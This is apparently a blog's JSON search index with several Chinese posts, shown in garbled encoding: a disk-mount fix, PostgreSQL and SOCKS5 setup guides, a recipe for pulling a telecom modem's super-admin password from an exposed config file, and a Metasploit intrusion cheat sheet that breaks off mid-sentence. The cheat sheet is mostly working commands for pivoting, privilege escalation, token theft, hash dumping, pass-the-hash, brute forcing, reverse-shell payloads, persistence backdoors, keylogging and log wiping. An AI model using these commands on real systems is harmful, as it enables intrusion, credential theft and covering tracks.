[{"title":"MountyæŒ‚è½½å¤±è´¥è§£å†³æ–¹æ³•","url":"%2F2018%2F03%2F12%2FMounty%E6%8C%82%E8%BD%BD%E5%A4%B1%E8%B4%A5%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95%2F","content":"\n**é”™è¯¯è¿‡ç¨‹**ï¼š\n\nå¼€æœºå¯åŠ¨ `Mounty` æŒ‚è½½NTFSç£ç›˜æ—¶å‡ºç°æŒ‚è½½å¤±è´¥çš„æƒ…å†µï¼Œç£ç›˜åœ¨winä¸‹é¢æ²¡æœ‰å®‰å…¨åˆ é™¤å°±æ‹”å‡ºæ¥äº†ï¼Œå¯¼è‡´æ–‡ä»¶ç³»ç»Ÿä¸­æœ‰é”™è¯¯åŒºå—ï¼Œæ‰€ä»¥åœ¨MACä¸­ä¸èƒ½æŒ‚è½½æˆè¯»å†™æ¨¡å¼ã€‚\n\n![](https://ws4.sinaimg.cn/large/006tNbRwgy1fp9ungtfepj30ng08et8x.jpg)\n\nå·\"BOOTCAMP \"ä¸å¯é‡æ–°æŒ‚è½½\n\n\n\n**è§£å†³æ–¹æ¡ˆ**ï¼š\n\nåˆ° win ä¸‹ å¯¹ä¸å¯æŒ‚è½½çš„NTFSç£ç›˜ï¼Œè¿›è¡Œ `chkdsk /f` æ“ä½œ ï¼Œå¹¶åœ¨ç»“æŸåå®‰å…¨ç§»é™¤ç£ç›˜","tags":["Mounty"]},{"title":"MacOSå®‰è£…PostgreSQL","url":"%2F2018%2F03%2F09%2FMacOS%E5%AE%89%E8%A3%85PostgreSQL%2F","content":"\n\n\n### æµ‹è¯•ç¯å¢ƒ\n\n- macOS Sierra `10.12.6`\n\n### å®‰è£… PostgreSQL\n\n```\nbrew install postgresql\n```\n\n### é…ç½® PostgreSQL\n\n#### æŸ¥çœ‹ç‰ˆæœ¬\n\n```\nâœ  ~ pg_ctl -V\npg_ctl (PostgreSQL) 10.3\n```\n\nå®‰è£…æˆåŠŸä¹‹åï¼Œå®‰è£…è·¯å¾„ä¸ºï¼š`/usr/local/var/postgres`\n\n#### åˆå§‹åŒ–æ•°æ®åº“\n\n```\ninitdb /usr/local/var/postgres\n```\n\n#### æ‰‹åŠ¨å¯åŠ¨ PostgreSQL\n\n```\npg_ctl -D /usr/local/var/postgres -l /usr/local/var/postgres/server.log start\n```\n\n#### æŸ¥çœ‹ PostgreSQL è¿è¡ŒçŠ¶æ€\n\n```\npg_ctl -D /usr/local/var/postgres -l /usr/local/var/postgres/server.log status\n```\n\n#### æ‰‹åŠ¨åœæ­¢ PostgreSQL \n\n```\npg_ctl -D /usr/local/var/postgres -l /usr/local/var/postgres/server.log stop -s -m fast\n```\n\n#### æŸ¥çœ‹è¿›ç¨‹\n\n```\nps aux | grep postgres\n```\n\n#### åˆ›å»ºç”¨æˆ·å’Œæ•°æ®åº“ ï¼ˆæ­¤å¤„æœªæµ‹è¯•ï¼‰\n\n```\n#createuser will prompt you for a password, enter it twice.\n$ createuser -U postgres -P 123456\n$ createdb -O postgres -E utf8 test_db\n$ psql\npostgres=# GRANT ALL PRIVILEGES ON postgres TO postgres;\npostgres=# \\q\n```\n\n#### è¿›å…¥å‘½ä»¤è¡Œæ¨¡å¼\n\n```\npsql -U test test_db -h localhost -W\n```\n\n#### è®¾ç½®å¼€æœºè‡ªå¯åŠ¨\n\n```\nsudo ln -sfv /usr/local/opt/postgresql/*.plist ~/Library/LaunchAgents\nlaunchctl load ~/Library/LaunchAgents/homebrew.mxcl.postgresql.plist\n```\n\n\n\n\n\n### é”™è¯¯è§£å†³\n\n#### FATAL: Ident authentication failed for user\n\n```\nThis is because by default PostgreSQL uses â€˜identâ€™ authentication i.e it checks if the username exists on the system. You need to change authentication mode to â€˜trustâ€™ as we do not want to add a system user. Modify the settings in â€œpg_hba.confâ€ to use â€˜trustâ€™ authentication.\n```\n\nè¯·ä¿®æ”¹ `/usr/local/var/postgres/pg_hba.conf` ä¸ºï¼š\n\nå®‰è£… pgadminï¼Œä¸‹è½½åœ°å€ï¼š<http://www.pgadmin.org/download/macosx.php>\n\n\n\nviaï¼šhttps://yq.aliyun.com/articles/25638","tags":["Database"]},{"title":"å¤©ç¿¼å…‰çŒ«ç ´è§£è¶…çº§ç®¡ç†å‘˜è´¦å·å¯†ç ","url":"%2F2018%2F03%2F02%2F%E5%A4%A9%E7%BF%BC%E5%85%89%E7%8C%AB%E7%A0%B4%E8%A7%A3%E8%B6%85%E7%BA%A7%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%2F","content":"\n\n\n### è·å–å¯†ç çš„æ­¥éª¤\n\n1. é¦–å…ˆå»å…‰çŒ«åº•éƒ¨çœ‹çœ‹ï¼Œä½ ä¼šå‘ç°ä¸€ä¸ªæ™®é€šç”¨æˆ·çš„è´¦å·å’Œå¯†ç ï¼Œç™»å½•ä¹‹ã€‚\n\n   â€‹\n\n2. å‡è®¾ä½ çš„å…‰çŒ«IPæ˜¯ `192.168.1.1` è®¿é—® http://192.168.1.1/backupsettings.conf è¿™ä¸ªè¿æ¥ä¸‹è½½é…ç½®æ–‡ä»¶ã€‚\n\n3. é‡å‘½åé…ç½®æ–‡ä»¶  `backupsettings.conf`  ä¸º `backupsettings.conf.txt`  ã€‚\n\n4. æ‰¾åˆ°ç±»ä¼¼è¿™æ ·çš„åœ°æ–¹ï¼Œå°±æ˜¯è´¦å·å’Œå¯†ç ï¼š\n\n   ```\n   <X_CT-COM_TeleComAccount>\n           <Password>telecomadmin88888888</Password>\n   </X_CT-COM_TeleComAccount>\n   ```\n\n   å…¶ä¸­é€šç”¨è´¦å·æ˜¯ï¼š`telecomadmin`\n\n   å¯†ç åˆ™æ˜¯ï¼š`telecomadmin88888888`\n\n","tags":["å…‰çŒ«"]},{"title":"Linuxæ­å»ºSocks5æœåŠ¡ç«¯","url":"%2F2018%2F03%2F02%2FLinux%E6%90%AD%E5%BB%BASocks5%E6%9C%8D%E5%8A%A1%E7%AB%AF%2F","content":"\n### æµ‹è¯•ç¯å¢ƒ\n\n- CentOS release 6.5   `64 bit`\n\n### ä¸‹è½½å®‰è£…ä¸ç¼–è¯‘\n\n> å®‰è£…ä¾èµ–\n\n```bash\nyum -y install gcc gcc-c++ automake make pam-devel openldap-devel cyrus-sasl-devel openssl-devel\n```\n\n> å®‰è£…æœ€æ–°ç‰ˆï¼Œå¯ä»¥ä»è¿™é‡Œè·å–æœ€æ–°ç‰ˆ ==> [å®˜æ–¹ç½‘ç«™](http://ss5.sourceforge.net/)\n\nç›®å‰æˆ‘çš„æœ€æ–°ç‰ˆæ˜¯ `3.8.9-8`  ï¼Œä½¿ç”¨ wget ä¸‹è½½ï¼š\n\n```bash\nwget https://ncu.dl.sourceforge.net/project/ss5/ss5/3.8.9-8/ss5-3.8.9-8.tar.gz\n```\n\nè§£å‹ç¼–è¯‘\n\n```bash\ntar zxvf ./ss5-3.8.9-8.tar.gz\ncd ss5-3.8.9\n./configure\nmake\nmake install\n```\n\n### é…ç½®ä¸ä½¿ç”¨\n\n####è®¾ç½®å¼€æœºå¯åŠ¨\n\n```bssh\nchmod +x /etc/init.d/ss5\nchkconfig --add ss5\nchkconfig --level 345 ss5 on\n```\n\n#### ä¿®æ”¹è®¿é—®æ§åˆ¶é…ç½®\n\nç¨‹åºé»˜è®¤é…ç½®è·¯å¾„åœ¨ `/etc/opt/ss5`ï¼Œä¿®æ”¹é…ç½®æ¥å…è®¸è®¿é—®ï¼Œç¼–è¾‘ `/etc/opt/ss5/ss5.conf`æ–‡ä»¶ï¼Œæ‰¾åˆ°å¦‚ä¸‹ä½ç½®ï¼š\n\n```\n# ///////////////////////////////////////////////////////////////////////////////////\n#       SHost           SPort           Authentication\n#\nauth    0.0.0.0/0               -               -\n```\n\nä¸Šé¢çš„è‹±æ–‡å­—æ®µå’Œä¸‹é¢çš„å€¼ä¸€ä¸€å¯¹åº”ï¼Œå¦‚æœä¸éœ€è¦è®¤è¯ï¼Œåªç”¨æŠŠauthå‰é¢çš„ `#` å·å»æ‰å³å¯ã€‚ç„¶åè¿˜éœ€è¦ä¿®æ”¹ä¸€å¤„ï¼š\n\n```\n# /////////////////////////////////////////////////////////////////////////////////////////////////\n#      Auth     SHost           SPort   DHost           DPort   Fixup   Group   Band    ExpDate\n#\npermit -        0.0.0.0/0       -       0.0.0.0/0       -       -       -       -       -\n\n```\n\næ­¤å¤„ä¸ä¸ŠåŒç†ï¼Œå»æ‰ permit å‰é¢çš„`#` å·å³å¯ã€‚\n\n#### ä¿®æ”¹è®¿é—®æ§åˆ¶é…ç½® (å¸¦æƒé™è®¤è¯)\n\n**è¿™æ ·é…ç½®çš„ss5æ˜¯å¼€æ”¾æ€§çš„ï¼Œä»»ä½•èƒ½è®¿é—®åˆ°ä½ æœåŠ¡ç«¯å£çš„äººéƒ½èƒ½è®¿é—®ï¼Œå¦‚æœä½ è¦è®¾ç½®è´¦æˆ·æˆæƒè®¿é—®ï¼Œåˆ™å¯ä»¥é™åˆ¶ä½¿ç”¨è€…**\n\nå…·ä½“è®¾ç½®æˆæƒè®¿é—®çš„æ–¹æ³•å¦‚ä¸‹ï¼ŒåŒæ ·åœ¨  `/etc/opt/ss5/ss5.conf` æ–‡ä»¶ä¸­æ‰¾åˆ°ä¸Šé¢ä¸¤å¤„ï¼Œ\n\n```\n# ///////////////////////////////////////////////////////////////////////////////////\n#       SHost           SPort           Authentication\n#\nauth    0.0.0.0/0               -               -\n```\n\nçœ‹åˆ°åé¢åˆä¸€ä¸ª `Authentication` å­—æ®µï¼Œä¸‹é¢å¯¹åº”äº†ä¸€ä¸ª `-` ï¼Œè¿™é‡Œå°†æ¨ªæ æ”¹æˆ `u` å³å¯ï¼Œä¿®æ”¹åå¦‚ä¸‹ï¼š\n\n```\n# ///////////////////////////////////////////////////////////////////////////////////\n#       SHost           SPort           Authentication\n#\nauth    0.0.0.0/0               -               u\n```\n\nç„¶åè¿˜æœ‰ç¬¬äºŒå¤„ï¼š\n\n```\n# /////////////////////////////////////////////////////////////////////////////////////////////////\n#      Auth     SHost           SPort   DHost           DPort   Fixup   Group   Band    ExpDate\n#\npermit -        0.0.0.0/0       -       0.0.0.0/0       -       -       -       -       -\n\n```\n\nåŒæ · `Auth` ä¸‹é¢å¯¹åº”çš„æ¨ªæ  `-` æ”¹æˆ `u` ï¼Œä¿®æ”¹åå¦‚ä¸‹ï¼š\n\n```\n# /////////////////////////////////////////////////////////////////////////////////////////////////\n#      Auth     SHost           SPort   DHost           DPort   Fixup   Group   Band    ExpDate\n#\npermit u        0.0.0.0/0       -       0.0.0.0/0       -       -       -       -       -\n\n```\n\nè¿™æ ·å°±é…ç½®å¥½äº†å…è®¸æˆæƒè®¿é—®ï¼Œç„¶åä½ éœ€è¦æ·»åŠ æˆæƒç”¨æˆ·ï¼Œæ­¤æ—¶æ“ä½œ `/etc/opt/ss5/ss5.passwd`  æ–‡ä»¶ï¼Œæ·»åŠ è´¦æˆ·ï¼Œä¸€è¡Œä¸€ä¸ªï¼Œç”¨ç©ºæ ¼éš”å¼€è´¦å·å¯†ç  `/etc/opt/ss5/ss5.conf` å†…å®¹å¦‚ä¸‹ï¼š\n\n```\nadmin passw0rd123\nroot pa55w0Rdl23\n```\n\nè¿™é‡Œæ·»åŠ äº†ä¸¤ä¸ªæˆæƒè´¦æˆ·ï¼Œå¯ä¾›è¿æ¥ss5æœåŠ¡æ—¶æˆæƒè®¤è¯ã€‚\n\n#### ä¿®æ”¹é»˜è®¤ç«¯å£\n\n**ss5é»˜è®¤å¼€å¯çš„ä»£ç†ç«¯å£æ—¶1080ï¼Œè¿™æ˜¯ä¸€ä¸ªå¸¸ç”¨çš„ä»£ç†ç«¯å£ï¼Œç»å¸¸ä¼šè¢«ä¸€äº›é»‘å®¢ä½¿ç”¨æ‰«æå™¨å¿«é€Ÿæ•è·åˆ°ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¿®æ”¹é»˜è®¤ç«¯å£çš„æ–¹å¼æ¥éšè—ss5ä»£ç†æœåŠ¡**\n\nä¿®æ”¹é»˜è®¤ç«¯å£çš„æ–¹æ³•å¦‚ä¸‹ï¼Œç¼–è¾‘ `vim /etc/sysconfig/ss5` æ–‡ä»¶ï¼š\n\n```\n# Add startup option here\nSS5_OPTS=\" -u root -b 0.0.0.0:9999\"\n```\n\nå»æ‰ç¬¬äºŒè¡Œå‰é¢çš„ `#` äº•å·ä¸»é£Ÿ ï¼Œå¹¶å°†åŒå¼•å·ä¸­é—´çš„å†…å®¹ä¿®æ”¹ä¸ºä¸Šæ–‡ä¸­çš„é…ç½®ï¼Œå…¶ä¸­ `9999` æ˜¯ä¿®æ”¹åçš„ä»£ç†ç«¯å£ï¼Œæ¯æ¬¡ä¿®æ”¹é…ç½®éƒ½éœ€è¦é‡å¯ss5æœåŠ¡ï¼Œä½¿å…¶ç”Ÿæ•ˆã€‚\n\n#### å¯åŠ¨ã€å…³é—­ ss5 æœåŠ¡\n\nå¯åŠ¨æœåŠ¡\n\n```\nservice ss5 start\n```\n\nå…³é—­æœåŠ¡\n\n```\nservice ss5 stop\n```\n\næŸ¥çœ‹è¿è¡ŒçŠ¶æ€\n\n```\nservice ss5 status\n```\n\né‡å¯æœåŠ¡\n\n```\nservice ss5 restart\n```\n\n#### æŸ¥çœ‹æ—¥å¿—\n\n```bash\ntail -f /var/log/ss5/ss5.log\n```\n\n\n\nå®Œã€‚","tags":["Socks5"]},{"title":"MetaSploitå†…ç½‘æ¸—é€å…¨æŠ€å·§","url":"%2F2018%2F03%2F01%2FMetaSploit%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%85%A8%E6%8A%80%E5%B7%A7%2F","content":"\n## æŠ€å·§æ±‡æ€»\n\n\n\n### å†…ç½‘ä»£ç†\n\næ–¹æ³•ä¸€ï¼š\n\n```bash\nmeterpreter > run get_local_subnets //è·å–ç½‘æ®µ\nmeterpreter > run autoroute -s 172.2.175.0/24 //æ·»åŠ è·¯ç”±\nmeterpreter > run autoroute -p //æŸ¥çœ‹è·¯ç”±\nmeterpreter > run autoroute -d -s 172.2.175.0 //åˆ é™¤ç½‘æ®µ\nmeterpreter > run post/windows/gather/arp_scanner RHOSTS=7.7.7.0/24 //æ¢æµ‹è¯¥ç½‘æ®µä¸‹çš„å­˜æ´»ä¸»æœºã€‚\nmeterpreter > background //åå°sessions\n```\n\næ–¹æ³•äºŒï¼š\n\n```\nmeterpreter> run get_local_subnets #æŸ¥çœ‹ç½‘æ®µ/å­ç½‘ \nLocal subnet: 192.168.33.0/255.255.255.0 \nmeterpreter> background #è½¬å…¥åå°è¿è¡Œ \nmsf> route add 192.168.33.0 255.255.255.0 1 #æœ¬åœ°æ·»åŠ è·¯ç”±ä¿¡æ¯ \nmsf> route print #æŸ¥çœ‹æ·»åŠ çš„ä¿¡æ¯ \nmsf> use linux/samba/lsa_transnames_heap #å‡†å¤‡å‘å†…ç½‘ç›®æ ‡ä¸»æœºè¿›æ”» \nmsf> set payload linux/x86/shell/reverse_tcp \nmsf> set LHOST 10.10.1.129 #æ­¤å¤„ä¸ºattacking ä¸»æœºçš„å¤–ç½‘IP \nmsf> set LPORT 8080 \nmsf> set RHOST 192.168.33.132 #å†…ç½‘ç›®æ ‡ä¸»æœº \nmsf> exploit \nä¹Ÿå¯ä»¥ä½¿ç”¨è‡ªåŠ¨å¼æ·»åŠ è·¯ç”±æ¨¡å—ï¼š \nmsf> load auto_add_route \nmsf> exploit\n```\n\n### æƒé™æå‡\n\nè‡ªåŠ¨åŒ–ææƒï¼š\n\n```\nmeterpreter > getsystem //ç›´getsystemææƒï¼Œæœ€å¸¸ç”¨ç®€å•çš„åŠæ³•\n```\n\nåŠè‡ªåŠ¨ææƒï¼š\n\n```\nmeterpreter > background //å…ˆåå°è¿è¡Œä¼šè¯\n[*] Backgrounding session 1â€¦\nmsf > use post/windows/escalate/ms10_073_kbdlayout\nmsf > show options\nmsf > set session 1 //è®¾ç½®è¦ä½¿ç”¨çš„ä¼šè¯\nmsf post(ms10_073_kbdlayout) > exploit\næ³¨æ„ï¼šå¦‚æœåˆ›å»ºäº†ä¸€ä¸ªsystemè¿›ç¨‹ï¼Œå°±å¯ä»¥ç«‹é©¬sessions 1è¿›å…¥ä¼šè¯ï¼Œç„¶åpsæŸ¥çœ‹è¿›ç¨‹ï¼Œä½¿ç”¨migrate pidæ³¨å…¥åˆ°è¿›ç¨‹ã€‚\næˆ–è€…ç›´æ¥ï¼š\nmeterpreter > run post/windows/escalate/ms10_073_kbdlayout\n```\n\n\n\n### ä»¤ç‰Œçªƒå–ä¸æ¨¡æ‹Ÿ\n\nå½“æœ‰åŸŸæ§è´¦æˆ·ç™»é™†è‡³æœåŠ¡å™¨æ—¶å¯ä½¿ç”¨ä»¤ç‰Œæ¨¡æ‹Ÿè¿›è¡Œæ¸—é€å–å¾—åŸŸæ§æƒé™ï¼Œä¹‹åç™»é™†å…¶ä»–æœºå™¨æ—¶ä¸éœ€è¦ç™»é™†å¯†ç ã€‚ \n\n- çªƒå–ä»¤ç‰Œ\n\n```\nmeterpreter > use incognito //è¿›å…¥è¿™ä¸ªæ¨¡å—\nmeterpreter > list_tokens â€“u //æŸ¥çœ‹å­˜åœ¨çš„ä»¤ç‰Œ\nmeterpreter > impersonate_token NT AUTXXXX\\SYSTEM //ä»¤ç‰Œæ˜¯DelegationTokensä¸€åˆ—ï¼ŒgetuidæŸ¥çœ‹ï¼Œä¸¤ä¸ªæ–œæ \n\næ³¨ï¼šåªæœ‰å…·æœ‰â€œæ¨¡ä»¿å®‰å…¨ä»¤ç‰Œæƒé™â€çš„è´¦æˆ·æ‰èƒ½å»æ¨¡ä»¿åˆ«äººçš„ä»¤ç‰Œï¼Œä¸€èˆ¬å¤§å¤šæ•°çš„æœåŠ¡å‹è´¦æˆ·ï¼ˆIISã€MSSQLç­‰ï¼‰æœ‰è¿™ä¸ªæƒé™ï¼Œå¤§å¤šæ•°ç”¨æˆ·çº§çš„è´¦æˆ·æ²¡æœ‰è¿™ä¸ªæƒé™ã€‚ä¸€èˆ¬ä»webæ‹¿åˆ°çš„webshelléƒ½æ˜¯IISæœåŠ¡å™¨æƒé™ï¼Œæ˜¯å…·æœ‰è¿™ä¸ªæ¨¡ä»¿æƒé™çš„ï¼Œå»ºå¥½çš„è´¦æˆ·æ²¡æœ‰è¿™ä¸ªæƒé™ã€‚ä½¿ç”¨èœåˆ€ï¼ˆIISæœåŠ¡å™¨æƒé™ï¼‰åå¼¹meterpreteræ˜¯æœåŠ¡å‹æƒé™ã€‚\n```\n\n- ä»¤ç‰Œæ¨¡æ‹Ÿ\n\n  ```\n  meterpreter> ps # æŸ¥çœ‹ç›®æ ‡æœºå™¨è¿›ç¨‹ï¼Œæ‰¾å‡ºåŸŸæ§è´¦æˆ·è¿è¡Œçš„è¿›ç¨‹IDï¼Œå‡å¦‚å‘ç°PID ä¸º380 \n  meterpreter> steal_token 380 \n  æœ‰æ—¶ps å‘½ä»¤åˆ—å‡ºçš„è¿›ç¨‹ä¸­å¯èƒ½ä¸å­˜åœ¨åŸŸæ§è´¦æˆ·çš„è¿›ç¨‹ï¼Œæ­¤æ—¶ä½¿ç”¨incognito æ¨¡å—æŸ¥çœ‹å¯ \n  ç”¨tokenï¼š \n  meterpreter> use incognito \n  meterpreter> list_tokens â€“u #åˆ—å‡ºå¯ç”¨tokenï¼Œå‡å¦‚æ‰¾åˆ°åŸŸæ§token \n  meterpreter> impersonate_token SNEAKS.IN\\ihazdomainadmin \n  meterpreter> add_user hacker password â€“h 192.168.1.50 #åœ¨åŸŸæ§ä¸»æœºä¸Šæ·»åŠ è´¦æˆ· \n  meterpreter> add_group_user â€œDomain Adminsâ€ hacker â€“h 192.168.1.50 #å°†è´¦æˆ·æ·»åŠ è‡³åŸŸç®¡ç†å‘˜ç»„\n  ```\n\n  â€‹\n\n### BypassUAC\n\n```\nmsf > use exploit/windows/local/bypassuac //32ä½ä¸64ä½ä¸€æ ·ï¼Œå…¶ä»–å‡ ä¸ªæ¨¡å—ä¹Ÿä¸€æ ·\nmsf > show options\nmsf > set session 4\nmsf > run //æˆåŠŸåä¼šè¿”å›ä¸€ä¸ªæ–°çš„sessionï¼Œè¿›å…¥æ–°ä¼šè¯ï¼Œå‘ç°æƒé™æ²¡å˜ï¼Œä½¿ç”¨getsystemå³å¯å®Œæˆææƒ\n```\n\n\n\n### HashDump\n\n```\nmeterpreter > run post/windows/gather/smart_hashdump //è¯»å–hashè¿™ç§åšæ³•æœ€æ™ºèƒ½ï¼Œæ•ˆæœæœ€å¥½\n```\n\n64 ä½win7 ä¸‹éœ€è¦ç®¡ç†å‘˜æƒé™æ‰§è¡Œåé—¨ä¸”å…ˆgetsystemï¼Œç„¶åä½¿ç”¨ `run post/windows/gather/hashdump` æ¥dump hash æˆåŠŸç‡æ›´é«˜ã€‚ \nè€Œä¸”å¦‚æœè¦ä½¿ç”¨shell æ·»åŠ ç³»ç»Ÿè´¦æˆ·çš„è¯win7 ä¸‹å¾—å…ˆï¼š \n\n```\nrun post/windows/escalate/bypassuac\n```\n\nä¸ç„¶å¯èƒ½ä¸ä¼šæˆåŠŸ\n\n### æƒé™ç»´æŒ\n\n- æœåŠ¡å¯åŠ¨åé—¨\n\n  ```\n  meterpreter > run metsvc -A //å†å¼€èµ·ä¸€ä¸ªç»ˆç«¯ï¼Œè¿›å…¥msfconsole\n  msf > use exploit/multi/handler //æ–°ç»ˆç«¯ä¸­ç›‘å¬\n  msf > set payload windows/metsvc_bind_tcp\n  msf > set LPORT 31337\n  msf > set RHOST 192.168.0.128\n  msf > run //è·å–åˆ°çš„ä¼šè¯æ˜¯systemæƒé™\n  ```\n\n- å¯åŠ¨é¡¹å¯åŠ¨åé—¨\n\n  ```\n  meterpreter > run persistence -X -i 10 -p 6666 -r 192.168.71.105\n  ```\n  -X ç³»ç»Ÿå¼€æœºè‡ªå¯ï¼Œ-i 10 10ç§’é‡è¿ä¸€æ¬¡ï¼Œ-p ç›‘å¬ç«¯å£ï¼Œ-r ç›‘å¬æœºã€‚ç›´æ¥ç›‘å¬å°±å¥½äº†ï¼Œä»–è‡ªå·±ä¼šé“¾æ¥å›æ¥ã€‚æ³¨æ„åˆ°ç§»é™¤ persistence åé—¨çš„åŠæ³•æ˜¯åˆ é™¤ `HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\` ä¸­çš„æ³¨å†Œè¡¨é”®å’Œ `C:\\WINDOWS\\TEMP\\` ä¸­çš„ VBScript æ–‡ä»¶ã€‚\n  \n  ä¸‹æ¬¡è¿æ¥æ—¶ï¼š \n\n   ```\n   msf> use multi/handler \n   set payload windows/meterpreter/reverse_tcp \n   set LPOST 443 \n   set LHOST 192.168.1.111 \n   exploit \n   ```\n  \n   ä¼šåœ¨ä»¥ä¸‹ä½ç½®å’Œæ³¨å†Œè¡¨ä»¥éšæœºæ–‡ä»¶åå†™å…¥æ–‡ä»¶ç­‰ä¿¡æ¯ï¼Œå¦‚ï¼š \n  \n   ```\n   C:\\Users\\YourtUserName\\AppData\\Local\\Temp\\MXIxVNCy.vbs \n   C:\\Users\\YourtUserName\\AppData\\Local\\Temp\\radF871B.tmp\\svchost.exe \n   HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\DjMzwzCDaoIcgNP) \n   ```\n\n  ç¼ºç‚¹ï¼šå®¹æ˜“è¢«æ€æ¯’è½¯ä»¶æ€ ã€‚\n> å¼Šç«¯ï¼šè¿™ä¸¤ä¸ªåé—¨æœ‰ä¸ªå¼Šç«¯ï¼Œåœ¨è¿›ç¨‹ä¸­éƒ½ä¼šå­˜åœ¨æœåŠ¡åç§°ä¸ºmeterpreterçš„è¿›ç¨‹\n\n\n\n  \n\n### æ¼æ´æ‰«æ\n\n- ç«¯å£æ‰«æ\n\n  ```\n  use auxiliary/scanner/portscan/tcp\n  show options\n  set rhosts 192.168.2.1-255\n  set ports 21,22,25,443,445,1433,3306\n  set threads 20\n  exploit\n  ```\n\n- MSSQLå¼€å‘åˆ©ç”¨\n\n  1. å¯¹å„ä¸ªipæ˜¯å¦æœ‰mssqlæœåŠ¡çš„æ¢æµ‹\n\n     ```\n     use scanner/mssql/mssql_ping //æµ‹è¯•MSSQLçš„å­˜åœ¨å’Œä¿¡æ¯\n     show options\n     set rhosts 192.168.2.1-255\n     set threads 30\n     exploit\n     ```\n\n  2. å¯¹æ‰«æåˆ°çš„IPè¿›è¡Œçˆ†ç ´\n\n     ```\n     msf> use auxiliary/scanner/mssql/mssql_login \n     show options \n     set PASS_FILE /pentest/exploits/fasttrack/bin/dict/wordlist.txt \n     set RHOSTS 192.168.1.130 \n     set THREADS 10 \n     set verbose false \n     exploit \n     ```\n\n  3. saæƒé™å¯¹å…¶åˆ©ç”¨\n     ```\n     use admin/mssql/mssql_exec\n     set rhost 192.168.2.10\n     set password sa\n     set CMD cmd.exe /c echo hello\n     exploit\n     ```\n     \n  4. ä½¿ç”¨MSSQLè‡ªå¸¦çš„ `xp_cmdshell` æ·»åŠ è´¦æˆ·\n     ```\n     msf> use exploit/windows/mssql/mssql_payload \n     show options \n     set payload windows/meterpreter/reverse_tcp \n     set LHOST 192.168.1.111 \n     set LPORT 433 \n     set RHOST 192.168.1.130 \n     set PASSWORD password130 \n     exploit \n     ```\n\n- MySQLå¼€æ”¾åˆ©ç”¨\n\n  ```\n  å¾…å®Œå–„\n  ```\n\n  â€‹\n\n- çˆ†ç ´sshæ¨¡å—\n\n  ```\n  use auxiliary/scanner/ssh/ssh_login\n  set rhosts 7.7.7.20\n  set username root\n  set pass_file /root/pass.txt //åŠ è½½å­—å…¸ï¼Œå¯ä»¥æ”¶é›†å¯†ç åšå­—å…¸\n  set threads 50\n  run\n  ```\n\n- é€šè¿‡nmapæ‰«æåŸºæœ¬æ¼æ´\n\n  ```\n  msf > nmap â€“script=vuln å—å®³é¶æœºipåœ°å€\n  msf > nmap â€“script=mysql-info 192.168.0.4 //æ‰«æmysqlæ•°æ®åº“ä¿¡æ¯ ç‰ˆæœ¬ ç­‰..\n  ```\n\n###æ¸…é™¤ç—•è¿¹\n\n```\nmsf > clearev //åˆ é™¤ç›®æ ‡æœºä¸Šçš„åº”ç”¨ç¨‹åºã€ç³»ç»Ÿå’Œå®‰å…¨æ—¥å¿—ã€‚\n```\n\n\n\n### è¯»å–ç³»ç»Ÿè´¦å·å¯†ç \n\n- åŠ è½½mimikatz\n\n    ```\n    meterpreter > load mimikatz //åŠ è½½mimikatzæ¨¡å—\n    meterpreter > wdigest //éœ€è¦systemæƒé™\n    ```\n\n- è¯»å–Hashå¹¶ä½¿ç”¨smbåè®®ç™»å½•\n\n  ```\n  meterpreter> use priv \n  meterpreter> run post/windows/gather/hashdump \n  ```\n\n  å½“è·å–åˆ°å¯†ç çš„hash ä¹‹åæ— æ³•ç ´è§£å‡ºæ˜æ–‡å¯†ç ä¸”æ— æ³•ç›´æ¥ä½¿ç”¨hash ç™»é™†ï¼Œéœ€è¦ä½¿ç”¨ `pass-the-hash` æŠ€æœ¯ï¼š \n\n  ```\n  msf> use windows/smb/psexec \n  set PAYLOAD windows/meterpreter/reverse_tcp \n  set LHOST 192.168.1.111 \n  set LPORT 443 \n  set RHOST 192.168.1.130 \n  set SMBPass aad3b435b51404eeaad3b435b51404ee:b75989f65d1e04af7625ed712ac36c29 \n  exploit \n  ```\n\n  è·å–åˆ°ç³»ç»Ÿæƒé™åæˆ‘ä»¬å¯ä»¥æ–°å»ºä¸€ä¸ªæ™®é€šè´¦å·ï¼Œç„¶åä½¿ç”¨æ­¤è´¦å·æ‰§è¡Œæˆ‘ä»¬çš„åé—¨ï¼š \n  åœ¨ç›®æ ‡æœºå™¨ä¸Šæ‰§è¡Œï¼š\n\n  ```\n  net user hacker p@ssw0rd /add\n  ```\n\n  æœ¬åœ°ç”Ÿæˆä¸€ä¸ªåé—¨ç¨‹åºï¼š \n\n  ```\n  msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.111 LPORT=443 X > payload.exe \n  ```\n\n  å°†payload.exe æ‹·è´åˆ°ç›®æ ‡æœºå™¨ç„¶åä½¿ç”¨æ–°å»ºç«‹çš„è´¦å·æ‰§è¡Œæœ¬åœ°æ‰§è¡Œç«¯å£ç›‘å¬ï¼Œç­‰å¾…æ¥è‡ªç›®æ ‡æœºå™¨è¿æ¥ï¼š \n\n  ```\n  msfcli multi/handler PAYLOAD=windows/meterpreter/reverse_tcp \n  LHOST=192.168.1.111 LPORT=443 \n  use priv \n  getsystem \n  getuid \n  ```\n\n  è‡³æ­¤å–å¾—SYSTEM æƒé™\n\n### é”®ç›˜è®°å½•\n\n```\nmeterpreter> run post/windows/capture/keylog_recorder //è¿è¡Œé”®ç›˜è®°å½•æ¨¡å—ï¼Œä»–è‡ªå·±åˆ›å»ºæœ¬æ–‡ã€‚\n```\n\n/root/.msf3/loot/*.txt #æŸ¥çœ‹ç»“æœ \n\n### è¿›ç¨‹æƒé™è¿ç§»\n\nå½“æ”»å‡»æˆåŠŸåå°†è¿æ¥è¿›ç¨‹ä»ä¸ç¨³å®šè¿›ç¨‹ï¼ˆå¦‚ä½¿ç”¨æµè§ˆå™¨æº¢å‡ºæ¼æ´exp è¿›è¡Œæ”»å‡»æ—¶æµè§ˆå™¨å¯èƒ½ä¼šè¢«ç›®æ ‡å…³é—­ï¼‰è¿ç§»è‡³ç¨³å®šè¿›ç¨‹(explorer.exe)ï¼Œä¿æŒå¯è¿æ¥ã€‚\n\n```\nmeterpreter> run post/windows/manage/migrate \n```\n\nåœ¨64 ä½win7 ä¸­migrate 